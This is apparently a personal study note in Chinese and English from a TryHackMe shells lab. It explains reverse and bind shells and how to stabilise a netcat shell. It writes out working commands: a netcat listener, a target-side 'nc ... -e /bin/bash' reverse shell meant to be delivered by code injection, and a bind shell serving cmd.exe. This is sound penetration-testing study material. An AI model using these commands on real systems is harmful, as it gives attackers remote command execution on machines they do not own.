# Shell
> bash or sh programs in Linux and cmd.exe or Powershell on Windows.

[TOC]

## Type of shell
* Reverse Shell
* Bind Shell

## Tools
* Netcat
    * Shells are unstable by default.
    * Have .exe version
* Socat
    * superior than netcat
    * more difficult and rarely installed by default
    * Have .exe version
* Metasploit -- multi/handler
    * In the auxiliary/multi/handler module
    * The easiest way to handle staged payloads.
* Msfvenom
    * generate payloads immediately

## Interactivity

* Interactive 
> 像是Powershell, Bash, Zsh, sh或是任何的standard CLI environment都是interactive shells. <br> 這類的shell讓你可以在執行程式後和程式做互動 <br> ![](https://i.imgur.com/5ixb5t3.png) <br> 上圖中的ssh程式就是一種互動式程式
* Non-Interactive
> 在這類Shell中，使用者被限制在只能執行非互動式的程式，否則程式無法正常運作。<br> <font color=#FF0000>絕大多數的簡易Reverse Shell和Bind Shell都屬於非互動式的Shell</font> <br> ![](https://i.imgur.com/Gy6eAzw.png) <br> 上圖中的whoami指令是屬於非互動式的，所以在執行上不會有任何狀況發生，但如果執行ssh指令(或任意互動式指令)並不會回傳任何內容，可以看出互動式程式在非互動式的shell中是沒辦法運作的。<br> [圖中listener的定義](##語法解釋) 



## Reverse Shell
:::success
從target連回attacker  `比較常見`
:::
* A good way to bypass firewall rules 
(防火牆規則會限制port的連線)
* Whe receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell.
(必須對自己的網路做設定並同意靶機的連線)

範例如下:
**<font color= #FF0000>Attacker</font>**
```shell=
sudo nc -lvnp 443 #attacker
```

**<font color=#FF0000>Target</font>**
```shell=
nc <LOCAL-IP> <PORT> -e /bin/bash #target
#通常Target端是在web端透過code injection來實現這行指令
```

**(左Attacker 右Target)**
![](https://i.imgur.com/jZXOhAY.png)

從圖中可以看出Reverse Shell是<font color=#FF0000>**先**</font>從攻擊機開始監聽並從目標機送出連線請求。


## Bind Shell
:::success
從attacker連到target `很少使用，但很有用`
:::
* Be opened up to the internet.
(代表可以連上用惡意程式打開的port並且達到RCE的效果)
* It may be prevented by firewalls.

範例如下:
**<font color=#FF0000> Target </font>**
```shell=
nc -lvnp <port> -e "cmd.exe"
```

**<font color=#FF0000> Attacker </font>**
```shell=
nc MACHINE_IP <port>
```

**(左Attacker 右Target`Target為Windows機`)**`這裡開啟監聽的指令並不局限於Windows`
![](https://i.imgur.com/pspQ3xu.png)

從圖中可以看出Bind Shell是<font color=#FF0000>**先**</font>從Target開始監聽後並從攻擊機連回目標機。

## Ways to stablize netcat shell
1. Python
    > [color=#4cc6d3] `linux only` <br> Three stage process:<br>1. `python -c 'import pty;pty.spawn("/bin/bash")'`<br>透過python生成一個更好的bash shell，在某些目標上會需要指定python版本(將`python`替換為`python2`或是`python3`)，此時的shell雖然好一點了，但依舊無法透過`tab`來自動完成和上下鍵且`Ctrl + C`一樣會中斷shell。<br> 2.`export TERM=xterm`<br>這行指令會提供我們使用術語指令的權限，像是`clear`<br>3.`Ctrl + Z`<br>先把這個程式(這裡指shell)暫停後丟到後台，此時就會回到原本的terminal。<br> `stty raw -echo` <br> 這行指令會把當前terminal的echo功能關閉(功能包含tab autocompletes, the arrow keys, and Ctrl + C to kill process)<br> `fg` <br>最後使用fg指令把後臺的指令拿到前台來執行。<br> 這時接回來的shell就是可互動式的了。<br>範例如下:<br>![](https://i.imgur.com/fueD3uo.png)<br>可以看到上圖在執行完三個步驟後就能使用ssh(互動式)指令了。
    :::info
    需要注意的是如果shell停止運作的話(圖中netcat連過去得到的shell)，此時會回到自己的terminal，如果你嘗試輸入到terminal內的話會發現畫面上不會顯示任何內容，原因是因為在步驟3把echo給disable了，如果要解決這個問題只需要輸入<font color=#FF0000>`reset`</font>後按下enter即可。
    :::



## 語法解釋
 
```shell=
nc -lvnp <port> -e "cmd.exe"
```
1. nc --> netcat 縮寫
2. -l --> listen mode
3. -v --> verbose (use twice to be more verbose)
4. -n --> numeric-only IP address, no DNS (只接受IP，不接受Domain Name)
5. -p port --> local port number (can be individual or ranges: low-high `inclusive`)
6. -e filename --> specify filename to exec after connect (例子為連線後執行cmd.exe)
:::info
port的選擇可以任意，但低於1024的port號需要管理員權限(sudo)
:::

**<font color=#FF0000>截圖中的listener是以下指令的alias</font>**
```shell=
sudo rlwrap nc -lvnp 443 
```
1. [rlwrap](https://github.com/hanslub42/rlwrap) --> 一種readline wrapper，讓使用者可以透過任意按鍵修改指令(像是上下鍵找之前的指令)。

```shell=
nc <target-ip> <chosen-port>
```
1. 使用netcat連回目標機上我們開啟的監聽端口


## Reference
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* [Reverse Shell Cheatsheet  —  The PentestMonkey](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [SecList](https://github.com/danielmiessler/SecLists)
* [Shell Scripting – Interactive and Non-Interactive Shell](https://www.geeksforgeeks.org/shell-scripting-interactive-and-non-interactive-shell/)
* Kali linux -- /usr/share/webshells
* TryHackMe -- What the Shell?
